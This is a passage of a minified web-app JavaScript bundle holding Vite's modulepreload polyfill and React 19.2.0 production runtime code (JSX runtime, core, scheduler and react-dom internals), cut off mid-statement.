(function(){const u=document.createElement("link").relList;if(u&&u.supports&&u.supports("modulepreload"))return;for(const v of document.querySelectorAll('link[rel="modulepreload"]'))r(v);new MutationObserver(v=>{for(const R of v)if(R.type==="childList")for(const x of R.addedNodes)x.tagName==="LINK"&&x.rel==="modulepreload"&&r(x)}).observe(document,{childList:!0,subtree:!0});function m(v){const R={};return v.integrity&&(R.integrity=v.integrity),v.referrerPolicy&&(R.referrerPolicy=v.referrerPolicy),v.crossOrigin==="use-credentials"?R.credentials="include":v.crossOrigin==="anonymous"?R.credentials="omit":R.credentials="same-origin",R}function r(v){if(v.ep)return;v.ep=!0;const R=m(v);fetch(v.href,R)}})();var Nc={exports:{}},Nl={};/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Wf;function t0(){if(Wf)return Nl;Wf=1;var o=Symbol.for("react.transitional.element"),u=Symbol.for("react.fragment");function m(r,v,R){var x=null;if(R!==void 0&&(x=""+R),v.key!==void 0&&(x=""+v.key),"key"in v){R={};for(var L in v)L!=="key"&&(R[L]=v[L])}else R=v;return v=R.ref,{$$typeof:o,type:r,key:x,ref:v!==void 0?v:null,props:R}}return Nl.Fragment=u,Nl.jsx=m,Nl.jsxs=m,Nl}var Jf;function a0(){return Jf||(Jf=1,Nc.exports=t0()),Nc.exports}var f=a0(),qc={exports:{}},J={};/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Pf;function n0(){if(Pf)return J;Pf=1;var o=Symbol.for("react.transitional.element"),u=Symbol.for("react.portal"),m=Symbol.for("react.fragment"),r=Symbol.for("react.strict_mode"),v=Symbol.for("react.profiler"),R=Symbol.for("react.consumer"),x=Symbol.for("react.context"),L=Symbol.for("react.forward_ref"),C=Symbol.for("react.suspense"),g=Symbol.for("react.memo"),k=Symbol.for("react.lazy"),O=Symbol.for("react.activity"),q=Symbol.iterator;function j(p){return p===null||typeof p!="object"?null:(p=q&&p[q]||p["@@iterator"],typeof p=="function"?p:null)}var K={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},$=Object.assign,ae={};function W(p,S,B){this.props=p,this.context=S,this.refs=ae,this.updater=B||K}W.prototype.isReactComponent={},W.prototype.setState=function(p,S){if(typeof p!="object"&&typeof p!="function"&&p!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,p,S,"setState")},W.prototype.forceUpdate=function(p){this.updater.enqueueForceUpdate(this,p,"forceUpdate")};function ne(){}ne.prototype=W.prototype;function P(p,S,B){this.props=p,this.context=S,this.refs=ae,this.updater=B||K}var ie=P.prototype=new ne;ie.constructor=P,$(ie,W.prototype),ie.isPureReactComponent=!0;var le=Array.isArray;function ge(){}var I={H:null,A:null,T:null,S:null},_e=Object.prototype.hasOwnProperty;function Ne(p,S,B){var G=B.ref;return{$$typeof:o,type:p,key:S,ref:G!==void 0?G:null,props:B}}function He(p,S){return Ne(p.type,S,p.props)}function Ge(p){return typeof p=="object"&&p!==null&&p.$$typeof===o}function Re(p){var S={"=":"=0",":":"=2"};return"$"+p.replace(/[=:]/g,function(B){return S[B]})}var Ke=/\/+/g;function De(p,S){return typeof p=="object"&&p!==null&&p.key!=null?Re(""+p.key):S.toString(36)}function qe(p){switch(p.status){case"fulfilled":return p.value;case"rejected":throw p.reason;default:switch(typeof p.status=="string"?p.then(ge,ge):(p.status="pending",p.then(function(S){p.status==="pending"&&(p.status="fulfilled",p.value=S)},function(S){p.status==="pending"&&(p.status="rejected",p.reason=S)})),p.status){case"fulfilled":return p.value;case"rejected":throw p.reason}}throw p}function A(p,S,B,G,V){var F=typeof p;(F==="undefined"||F==="boolean")&&(p=null);var re=!1;if(p===null)re=!0;else switch(F){case"bigint":case"string":case"number":re=!0;break;case"object":switch(p.$$typeof){case o:case u:re=!0;break;case k:return re=p._init,A(re(p._payload),S,B,G,V)}}if(re)return V=V(p),re=G===""?"."+De(p,0):G,le(V)?(B="",re!=null&&(B=re.replace(Ke,"$&/")+"/"),A(V,S,B,"",function(Gn){return Gn})):V!=null&&(Ge(V)&&(V=He(V,B+(V.key==null||p&&p.key===V.key?"":(""+V.key).replace(Ke,"$&/")+"/")+re)),S.push(V)),1;re=0;var Qe=G===""?".":G+":";if(le(p))for(var Ce=0;Ce<p.length;Ce++)G=p[Ce],F=Qe+De(G,Ce),re+=A(G,S,B,F,V);else if(Ce=j(p),typeof Ce=="function")for(p=Ce.call(p),Ce=0;!(G=p.next()).done;)G=G.value,F=Qe+De(G,Ce++),re+=A(G,S,B,F,V);else if(F==="object"){if(typeof p.then=="function")return A(qe(p),S,B,G,V);throw S=String(p),Error("Objects are not valid as a React child (found: "+(S==="[object Object]"?"object with keys {"+Object.keys(p).join(", ")+"}":S)+"). If you meant to render a collection of children, use an array instead.")}return re}function z(p,S,B){if(p==null)return p;var G=[],V=0;return A(p,G,"","",function(F){return S.call(B,F,V++)}),G}function H(p){if(p._status===-1){var S=p._result;S=S(),S.then(function(B){(p._status===0||p._status===-1)&&(p._status=1,p._result=B)},function(B){(p._status===0||p._status===-1)&&(p._status=2,p._result=B)}),p._status===-1&&(p._status=0,p._result=S)}if(p._status===1)return p._result.default;throw p._result}var N=typeof reportError=="function"?reportError:function(p){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var S=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof p=="object"&&p!==null&&typeof p.message=="string"?String(p.message):String(p),error:p});if(!window.dispatchEvent(S))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",p);return}console.error(p)},U={map:z,forEach:function(p,S,B){z(p,function(){S.apply(this,arguments)},B)},count:function(p){var S=0;return z(p,function(){S++}),S},toArray:function(p){return z(p,function(S){return S})||[]},only:function(p){if(!Ge(p))throw Error("React.Children.only expected to receive a single React element child.");return p}};return J.Activity=O,J.Children=U,J.Component=W,J.Fragment=m,J.Profiler=v,J.PureComponent=P,J.StrictMode=r,J.Suspense=C,J.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=I,J.__COMPILER_RUNTIME={__proto__:null,c:function(p){return I.H.useMemoCache(p)}},J.cache=function(p){return function(){return p.apply(null,arguments)}},J.cacheSignal=function(){return null},J.cloneElement=function(p,S,B){if(p==null)throw Error("The argument must be a React element, but you passed "+p+".");var G=$({},p.props),V=p.key;if(S!=null)for(F in S.key!==void 0&&(V=""+S.key),S)!_e.call(S,F)||F==="key"||F==="__self"||F==="__source"||F==="ref"&&S.ref===void 0||(G[F]=S[F]);var F=arguments.length-2;if(F===1)G.children=B;else if(1<F){for(var re=Array(F),Qe=0;Qe<F;Qe++)re[Qe]=arguments[Qe+2];G.children=re}return Ne(p.type,V,G)},J.createContext=function(p){return p={$$typeof:x,_currentValue:p,_currentValue2:p,_threadCount:0,Provider:null,Consumer:null},p.Provider=p,p.Consumer={$$typeof:R,_context:p},p},J.createElement=function(p,S,B){var G,V={},F=null;if(S!=null)for(G in S.key!==void 0&&(F=""+S.key),S)_e.call(S,G)&&G!=="key"&&G!=="__self"&&G!=="__source"&&(V[G]=S[G]);var re=arguments.length-2;if(re===1)V.children=B;else if(1<re){for(var Qe=Array(re),Ce=0;Ce<re;Ce++)Qe[Ce]=arguments[Ce+2];V.children=Qe}if(p&&p.defaultProps)for(G in re=p.defaultProps,re)V[G]===void 0&&(V[G]=re[G]);return Ne(p,F,V)},J.createRef=function(){return{current:null}},J.forwardRef=function(p){return{$$typeof:L,render:p}},J.isValidElement=Ge,J.lazy=function(p){return{$$typeof:k,_payload:{_status:-1,_result:p},_init:H}},J.memo=function(p,S){return{$$typeof:g,type:p,compare:S===void 0?null:S}},J.startTransition=function(p){var S=I.T,B={};I.T=B;try{var G=p(),V=I.S;V!==null&&V(B,G),typeof G=="object"&&G!==null&&typeof G.then=="function"&&G.then(ge,N)}catch(F){N(F)}finally{S!==null&&B.types!==null&&(S.types=B.types),I.T=S}},J.unstable_useCacheRefresh=function(){return I.H.useCacheRefresh()},J.use=function(p){return I.H.use(p)},J.useActionState=function(p,S,B){return I.H.useActionState(p,S,B)},J.useCallback=function(p,S){return I.H.useCallback(p,S)},J.useContext=function(p){return I.H.useContext(p)},J.useDebugValue=function(){},J.useDeferredValue=function(p,S){return I.H.useDeferredValue(p,S)},J.useEffect=function(p,S){return I.H.useEffect(p,S)},J.useEffectEvent=function(p){return I.H.useEffectEvent(p)},J.useId=function(){return I.H.useId()},J.useImperativeHandle=function(p,S,B){return I.H.useImperativeHandle(p,S,B)},J.useInsertionEffect=function(p,S){return I.H.useInsertionEffect(p,S)},J.useLayoutEffect=function(p,S){return I.H.useLayoutEffect(p,S)},J.useMemo=function(p,S){return I.H.useMemo(p,S)},J.useOptimistic=function(p,S){return I.H.useOptimistic(p,S)},J.useReducer=function(p,S,B){return I.H.useReducer(p,S,B)},J.useRef=function(p){return I.H.useRef(p)},J.useState=function(p){return I.H.useState(p)},J.useSyncExternalStore=function(p,S,B){return I.H.useSyncExternalStore(p,S,B)},J.useTransition=function(){return I.H.useTransition()},J.version="19.2.0",J}var Ff;function Kc(){return Ff||(Ff=1,qc.exports=n0()),qc.exports}var se=Kc(),Uc={exports:{}},ql={},zc={exports:{}},Bc={};/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var em;function l0(){return em||(em=1,(function(o){function u(A,z){var H=A.length;A.push(z);e:for(;0<H;){var N=H-1>>>1,U=A[N];if(0<v(U,z))A[N]=z,A[H]=U,H=N;else break e}}function m(A){return A.length===0?null:A[0]}function r(A){if(A.length===0)return null;var z=A[0],H=A.pop();if(H!==z){A[0]=H;e:for(var N=0,U=A.length,p=U>>>1;N<p;){var S=2*(N+1)-1,B=A[S],G=S+1,V=A[G];if(0>v(B,H))G<U&&0>v(V,B)?(A[N]=V,A[G]=H,N=G):(A[N]=B,A[S]=H,N=S);else if(G<U&&0>v(V,H))A[N]=V,A[G]=H,N=G;else break e}}return z}function v(A,z){var H=A.sortIndex-z.sortIndex;return H!==0?H:A.id-z.id}if(o.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var R=performance;o.unstable_now=function(){return R.now()}}else{var x=Date,L=x.now();o.unstable_now=function(){return x.now()-L}}var C=[],g=[],k=1,O=null,q=3,j=!1,K=!1,$=!1,ae=!1,W=typeof setTimeout=="function"?setTimeout:null,ne=typeof clearTimeout=="function"?clearTimeout:null,P=typeof setImmediate<"u"?setImmediate:null;function ie(A){for(var z=m(g);z!==null;){if(z.callback===null)r(g);else if(z.startTime<=A)r(g),z.sortIndex=z.expirationTime,u(C,z);else break;z=m(g)}}function le(A){if($=!1,ie(A),!K)if(m(C)!==null)K=!0,ge||(ge=!0,Re());else{var z=m(g);z!==null&&qe(le,z.startTime-A)}}var ge=!1,I=-1,_e=5,Ne=-1;function He(){return ae?!0:!(o.unstable_now()-Ne<_e)}function Ge(){if(ae=!1,ge){var A=o.unstable_now();Ne=A;var z=!0;try{e:{K=!1,$&&($=!1,ne(I),I=-1),j=!0;var H=q;try{t:{for(ie(A),O=m(C);O!==null&&!(O.expirationTime>A&&He());){var N=O.callback;if(typeof N=="function"){O.callback=null,q=O.priorityLevel;var U=N(O.expirationTime<=A);if(A=o.unstable_now(),typeof U=="function"){O.callback=U,ie(A),z=!0;break t}O===m(C)&&r(C),ie(A)}else r(C);O=m(C)}if(O!==null)z=!0;else{var p=m(g);p!==null&&qe(le,p.startTime-A),z=!1}}break e}finally{O=null,q=H,j=!1}z=void 0}}finally{z?Re():ge=!1}}}var Re;if(typeof P=="function")Re=function(){P(Ge)};else if(typeof MessageChannel<"u"){var Ke=new MessageChannel,De=Ke.port2;Ke.port1.onmessage=Ge,Re=function(){De.postMessage(null)}}else Re=function(){W(Ge,0)};function qe(A,z){I=W(function(){A(o.unstable_now())},z)}o.unstable_IdlePriority=5,o.unstable_ImmediatePriority=1,o.unstable_LowPriority=4,o.unstable_NormalPriority=3,o.unstable_Profiling=null,o.unstable_UserBlockingPriority=2,o.unstable_cancelCallback=function(A){A.callback=null},o.unstable_forceFrameRate=function(A){0>A||125<A?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):_e=0<A?Math.floor(1e3/A):5},o.unstable_getCurrentPriorityLevel=function(){return q},o.unstable_next=function(A){switch(q){case 1:case 2:case 3:var z=3;break;default:z=q}var H=q;q=z;try{return A()}finally{q=H}},o.unstable_requestPaint=function(){ae=!0},o.unstable_runWithPriority=function(A,z){switch(A){case 1:case 2:case 3:case 4:case 5:break;default:A=3}var H=q;q=A;try{return z()}finally{q=H}},o.unstable_scheduleCallback=function(A,z,H){var N=o.unstable_now();switch(typeof H=="object"&&H!==null?(H=H.delay,H=typeof H=="number"&&0<H?N+H:N):H=N,A){case 1:var U=-1;break;case 2:U=250;break;case 5:U=1073741823;break;case 4:U=1e4;break;default:U=5e3}return U=H+U,A={id:k++,callback:z,priorityLevel:A,startTime:H,expirationTime:U,sortIndex:-1},H>N?(A.sortIndex=H,u(g,A),m(C)===null&&A===m(g)&&($?(ne(I),I=-1):$=!0,qe(le,H-N))):(A.sortIndex=U,u(C,A),K||j||(K=!0,ge||(ge=!0,Re()))),A},o.unstable_shouldYield=He,o.unstable_wrapCallback=function(A){var z=q;return function(){var H=q;q=z;try{return A.apply(this,arguments)}finally{q=H}}}})(Bc)),Bc}var tm;function s0(){return tm||(tm=1,zc.exports=l0()),zc.exports}var jc={exports:{}},Pe={};/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var am;function i0(){if(am)return Pe;am=1;var o=Kc();function u(C){var g="https://react.dev/errors/"+C;if(1<arguments.length){g+="?args[]="+encodeURIComponent(arguments[1]);for(var k=2;k<arguments.length;k++)g+="&args[]="+encodeURIComponent(arguments[k])}return"Minified React error #"+C+"; visit "+g+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function m(){}var r={d:{f:m,r:function(){throw Error(u(522))},D:m,C:m,L:m,m,X:m,S:m,M:m},p:0,findDOMNode:null},v=Symbol.for("react.portal");function R(C,g,k){var O=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:v,key:O==null?null:""+O,children:C,containerInfo:g,implementation:k}}var x=o.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function L(C,g){if(C==="font")return"";if(typeof g=="string")return g==="use-credentials"?g:""}return Pe.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=r,Pe.createPortal=function(C,g){var k=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!g||g.nodeType!==1&&g.nodeType!==9&&g.nodeType!==11)throw Error(u(299));return R(C,g,null,k)},Pe.flushSync=function(C){var g=x.T,k=r.p;try{if(x.T=null,r.p=2,C)return C()}finally{x.T=g,r.p=k,r.d.f()}},Pe.preconnect=function(C,g){typeof C=="string"&&(g?(g=g.crossOrigin,g=typeof g=="string"?g==="use-credentials"?g:"":void 0):g=null,r.d.C(C,g))},Pe.prefetchDNS=function(C){typeof C=="string"&&r.d.D(C)},Pe.preinit=function(C,g){if(typeof C=="string"&&g&&typeof g.as=="string"){var k=g.as,O=L(k,g.crossOrigin),q=typeof g.integrity=="string"?g.integrity:void 0,j=typeof g.fetchPriority=="string"?g.fetchPriority:void 0;k==="style"?r.d.S(C,typeof g.precedence=="string"?g.precedence:void 0,{crossOrigin:O,integrity:q,fetchPriority:j}):k==="script"&&r.d.X(C,{crossOrigin:O,integrity:q,fetchPriority:j,nonce:typeof g.nonce=="string"?g.nonce:void 0})}},Pe.preinitModule=function(C,g){if(typeof C=="string")if(typeof g=="object"&&g!==null){if(g.as==null||g.as==="script"){var k=L(g.as,g.crossOrigin);r.d.M(C,{crossOrigin:k,integrity:typeof g.integrity=="string"?g.integrity:void 0,nonce:typeof g.nonce=="string"?g.nonce:void 0})}}else g==null&&r.d.M(C)},Pe.preload=function(C,g){if(typeof C=="string"&&typeof g=="object"&&g!==null&&typeof g.as=="string"){var k=g.as,O=L(k,g.crossOrigin);r.d.L(C,k,{crossOrigin:O,integrity:typeof g.integrity=="string"?g.integrity:void 0,nonce:typeof g.nonce=="string"?g.nonce:void 0,type:typeof g.type=="string"?g.type:void 0,fetchPriority:typeof g.fetchPriority=="string"?g.fetchPriority:void 0,referrerPolicy:typeof g.referrerPolicy=="string"?g.referrerPolicy:void 0,imageSrcSet:typeof g.imageSrcSet=="string"?g.imageSrcSet:void 0,imageSizes:typeof g.imageSizes=="string"?g.imageSizes:void 0,media:typeof g.media=="string"?g.media:void 0})}},Pe.preloadModule=function(C,g){if(typeof C=="string")if(g){var k=L(g.as,g.crossOrigin);r.d.m(C,{as:typeof g.as=="string"&&g.as!=="script"?g.as:void 0,crossOrigin:k,integrity:typeof g.integrity=="string"?g.integrity:void 0})}else r.d.m(C)},Pe.requestFormReset=function(C){r.d.r(C)},Pe.unstable_batchedUpdates=function(C,g){return C(g)},Pe.useFormState=function(C,g,k){return x.H.useFormState(C,g,k)},Pe.useFormStatus=function(){return x.H.useHostTransitionStatus()},Pe.version="19.2.0",Pe}var nm;function vm(){if(nm)return jc.exports;nm=1;function o(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(o)}catch(u){console.error(u)}}return o(),jc.exports=i0(),jc.exports}/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var lm;function o0(){if(lm)return ql;lm=1;var o=s0(),u=Kc(),m=vm();function r(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var a=2;a<arguments.length;a++)t+="&args[]="+encodeURIComponent(arguments[a])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function v(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function R(e){var t=e,a=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(a=t.return),e=t.return;while(e)}return t.tag===3?a:null}function x(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function L(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function C(e){if(R(e)!==e)throw Error(r(188))}function g(e){var t=e.alternate;if(!t){if(t=R(e),t===null)throw Error(r(188));return t!==e?null:e}for(var a=e,n=t;;){var l=a.return;if(l===null)break;var s=l.alternate;if(s===null){if(n=l.return,n!==null){a=n;continue}break}if(l.child===s.child){for(s=l.child;s;){if(s===a)return C(l),e;if(s===n)return C(l),t;s=s.sibling}throw Error(r(188))}if(a.return!==n.return)a=l,n=s;else{for(var i=!1,c=l.child;c;){if(c===a){i=!0,a=l,n=s;break}if(c===n){i=!0,n=l,a=s;break}c=c.sibling}if(!i){for(c=s.child;c;){if(c===a){i=!0,a=s,n=l;break}if(c===n){i=!0,n=s,a=l;break}c=c.sibling}if(!i)throw Error(r(189))}}if(a.alternate!==n)throw Error(r(190))}if(a.tag!==3)throw Error(r(188));return a.stateNode.current===a?e:t}function k(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=k(e),t!==null)return t;e=e.sibling}return null}var O=Object.assign,q=Symbol.for("react.element"),j=Symbol.for("react.transitional.element"),K=Symbol.for("react.portal"),$=Symbol.for("react.fragment"),ae=Symbol.for("react.strict_mode"),W=Symbol.for("react.profiler"),ne=Symbol.for("react.consumer"),P=Symbol.for("react.context"),ie=Symbol.for("react.forward_ref"),le=Symbol.for("react.suspense"),ge=Symbol.for("react.suspense_list"),I=Symbol.for("react.memo"),_e=Symbol.for("react.lazy"),Ne=Symbol.for("react.activity"),He=Symbol.for("react.memo_cache_sentinel"),Ge=Symbol.iterator;function Re(e){return e===null||typeof e!="object"?null:(e=Ge&&e[Ge]||e["@@iterator"],typeof e=="function"?e:null)}var Ke=Symbol.for("react.client.reference");function De(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===Ke?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case $:return"Fragment";case W:return"Profiler";case ae:return"StrictMode";case le:return"Suspense";case ge:return"SuspenseList";case Ne:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case K:return"Portal";case P:return e.displayName||"Context";case ne:return(e._context.displayName||"Context")+".Consumer";case ie:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case I:return t=e.displayName||null,t!==null?t:De(e.type)||"Memo";case _e:t=e._payload,e=e._init;try{return De(e(t))}catch{}}return null}var qe=Array.isArray,A=u.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,z=m.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,H={pending:!1,data:null,method:null,action:null},N=[],U=-1;function p(e){return{current:e}}function S(e){0>U||(e.current=N[U],N[U]=null,U--)}function B(e,t){U++,N[U]=e.current,e.current=t}var G=p(null),V=p(null),F=p(null),re=p(null);function Qe(e,t){switch(B(F,t),B(V,e),B(G,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?Sf(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=Sf(t),e=bf(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}S(G),B(G,e)}function Ce(){S(G),S(V),S(F)}function Gn(e){e.memoizedState!==null&&B(re,e);var t=G.current,a=bf(t,e.type);t!==a&&(B(V,e),B(G,a))}function Bl(e){V.current===e&&(S(G),S(V)),re.current===e&&(S(re),kl._currentValue=H)}var hi,Zc;function wa(e){if(hi===void 0)try{throw Error()}catch(a){var t=a.stack.trim().match(/\n( *(at )?)/);hi=t&&t[1]||"",Zc=-1<a.stack.indexOf(`
    at`)?" (<anonymous>)":-1<a.stack.indexOf("@")?"@unknown:0:0":""}return`
`+hi+e+Zc}var gi=!1;function yi(e,t){if(!e||gi)return"";gi=!0;var a=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var n={DetermineComponentFrameRoot:function(){try{if(t){var M=function(){throw Error()};if(Object.defineProperty(M.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(M,[])}catch(_){var T=_}Reflect.construct(e,[],M)}else{try{M.call()}catch(_){T=_}e.call(M.prototype)}}else{try{throw Error()}catch(_){T=_}(M=e())&&typeof M.catch=="function"&&M.catch(function(){})}}catch(_){if(_&&T&&typeof _.stack=="string")return[_.stack,T.stack]}return[null,null]}};n.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var l=Object.getOwnPropertyDescriptor(n.DetermineComponentFrameRoot,"name");l&&l.configurable&&Object.defineProperty(n.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var s=n.DetermineComponentFrameRoot(),i=s[0],c=s[1];if(i&&c){var d=i.split(`
`),E=c.split(`
`);for(l=n=0;n<d.length&&!d[n].includes("DetermineComponentFrameRoot");)n++;for(;l<E.length&&!E[l].includes("DetermineComponentFrameRoot");)l++;if(n===d.length||l===E.length)for(n=d.length-1,l=E.length-1;1<=n&&0<=l&&d[n]!==E[l];)l--;for(;1<=n&&0<=l;n--,l--)if(d[n]!==E[l]){if(n!==1||l!==1)do if(n--,l--,0>l||d[n]!==E[l]){var D=`
`+d[n].replace(" at new "," at ");return e.displayName&&D.includes("<anonymous>")&&(D=D.replace("<anonymous>",e.displayName)),D}while(1<=n&&0<=l);break}}}finally{gi=!1,Error.prepareStackTrace=a}return(a=e?e.displayName||e.name:"")?wa(a):""}function Mm(e,t){switch(e.tag){case 26:case 27:case 5:return wa(e.type);case 16:return wa("Lazy");case 13:return e.child!==t&&t!==null?wa("Suspense Fallback"):wa("Suspense");case 19:return wa("SuspenseList");case 0:case 15:return yi(e.type,!1);case 11:return yi(e.type.render,!1);case 1:return yi(e.type,!0);case 31:return wa("Activity");default:return""}}function $c(e){try{var t="",a=null;do t+=Mm(e,a),a=e,e=e.return;while(e);return t}catch(n){return`
Error generating stack: `+n.message+`
`+n.stack}}var vi=Object.prototype.hasOwnProperty,Si=o.unstable_scheduleCallback,bi=o.unstable_cancelCallback,Lm=o.unstable_shouldYield,Nm=o.unstable_requestPaint,ot=o.unstable_now,qm=o.unstable_getCurrentPriorityLevel,Wc=o.unstable_ImmediatePriority,Jc=o.unstable_UserBlockingPriority,jl=o.unstable_NormalPriority,Um=o.unstable_LowPriority,Pc=o.unstable_IdlePriority,zm=o.log,Bm=o.unstable_setDisableYieldValue,Qn=null,ct=null;function la(e){if(typeof zm=="function"&&Bm(e),ct&&typeof ct.setStrictMode=="function")try{ct.setStrictMode(Qn,e)}catch{}}var rt=Math.clz32?Math.clz32:Gm,jm=Math.log,Hm=Math.LN2;function Gm(e){return e>>>=0,e===0?32:31-(jm(e)/Hm|0)|0}var Hl=256,Gl=262144,Ql=4194304;function Ma(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Yl(e,t,a){var n=e.pendingLanes;if(n===0)return 0;var l=0,s=e.suspendedLanes,i=e.pingedLanes;e=e.warmLanes;var c=n&134217727;return c!==0?(n=c&~s,n!==0?l=Ma(n):(i&=c,i!==0?l=Ma(i):a||(a=c&~e,a!==0&&(l=Ma(a))))):(c=n&~s,c!==0?l=Ma(c):i!==0?l=Ma(i):a||(a=n&~e,a!==0&&(l=Ma(a)))),l===0?0:t!==0&&t!==l&&(t&s)===0&&(s=l&-l,a=t&-t,s>=a||s===32&&(a&4194048)!==0)?t:l}function Yn(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function Qm(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Fc(){var e=Ql;return Ql<<=1,(Ql&62914560)===0&&(Ql=4194304),e}function Ei(e){for(var t=[],a=0;31>a;a++)t.push(e);return t}function Kn(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function Ym(e,t,a,n,l,s){var i=e.pendingLanes;e.pendingLanes=a,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=a,e.entangledLanes&=a,e.errorRecoveryDisabledLanes&=a,e.shellSuspendCounter=0;var c=e.entanglements,d=e.expirationTimes,E=e.hiddenUpdates;for(a=i&~a;0<a;){var D=31-rt(a),M=1<<D;c[D]=0,d[D]=-1;var T=E[D];if(T!==null)for(E[D]=null,D=0;D<T.length;D++){var _=T[D];_!==null&&(_.lane&=-536870913)}a&=~M}n!==0&&er(e,n,0),s!==0&&l===0&&e.tag!==0&&(e.suspendedLanes|=s&~(i&~t))}function er(e,t,a){e.pendingLanes|=t,e.suspendedLanes&=~t;var n=31-rt(t);e.entangledLanes|=t,e.entanglements[n]=e.entanglements[n]|1073741824|a&261930}function tr(e,t){var a=e.entangledLanes|=t;for(e=e.entanglements;a;){var n=31-rt(a),l=1<<n;l&t|e[n]&t&&(e[n]|=t),a&=~l}}function ar(e,t){var a=t&-t;return a=(a&42)!==0?1:Ti(a),(a&(e.suspendedLanes|t))!==0?0:a}function Ti(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function _i(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function nr(){var e=z.p;return e!==0?e:(e=window.event,e===void 0?32:Yf(e.type))}function lr(e,t){var a=z.p;try{return z.p=e,t()}finally{z.p=a}}var 